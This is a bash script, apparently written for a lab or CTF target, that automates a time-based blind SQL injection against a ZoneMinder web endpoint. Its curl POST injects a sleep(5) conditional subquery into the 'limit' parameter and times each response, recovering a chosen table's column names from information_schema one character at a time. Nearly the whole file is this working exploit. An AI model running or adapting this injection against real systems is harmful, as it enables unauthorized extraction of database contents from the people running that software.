#!/bin/bash

# DEFINITION OF COLORS TO USE IN BASH SCRIPTS
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURE Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detected Ctrl+C"
echo -e "[${red}*${def}] Finalizing execution..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} ERROR: the name of the table to be listed has not been provided\n"
echo -e "${white}[${def}-${white}]${def} USAGE:\n\t${white}$0 ${yellow}<table_name>${def}"
echo -e "\t${grey}$0 Users${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} REMEMBER:\n\t The ${white}Table names${def} are ${white}CASE SENSITIVE${def}"
echo -e "\tTry with the first letter in uppercase and the rest in lowercase."
exit 0
}

if [[ "$#" -lt 1 ]]
then
usage
fi

tput civis

# ADAPT THESE VALUES
host='192.168.102.52'
tablename=$1 # pass the name of the table to list as argument 1
tablelimit=100
charlimit=100

# variable to store the characters to be tested
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!ยก\/{}[]'

# variable to store the results
result=""
whitechar=0
whitecolumn=0

echo -e "\n${white}[${green}*${white}] --- Enumerating table COLUMNS ${yellow}$tablename ${white}--- [${green}*${white}]${def}\n"

for (( t=0; t <= $tablelimit; t++)) # COLUMNS limit
do
if [[ "whitecolumn" -ge "2" ]]
then
echo -e "[${yellow}ยก${def}] Second blank COLUMN"
echo -e "[${green}*${def}] End of COLUMN enumeration"
tput cnorm
exit 0
fi
echo -e "${white}Enumerating COLUMNS ${cian}$t${def}\n"
for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then

echo -e "  \e[1A\e[K[${grey}-${def}] Second blank character"
echo -e "  End of enumeration of COLUMN $t\n"
echo -e "  ${white}Column: ${green}$result${def}\n\n"

chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whitecolumn=$((whitecolumn + 1))
fi
break
fi

# nested loop that loops through each of the characters stored in the char variable
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KTesting character ${char:$k:1} in position $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select column_name from information_schema.columns where table_name='$tablename' limit $t,1),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# check whether the difference between the start and end time is greater than 5 seconds
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "  \e[1A\e[KCharacters found: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCharacters found: $result\n"
whitechar=0
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  The limit of $charlimit characters per column has been reached."
echo -e "\n  ${yellow}Column: $result${def}\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}]End of COLUMNS enumeration"
tput cnorm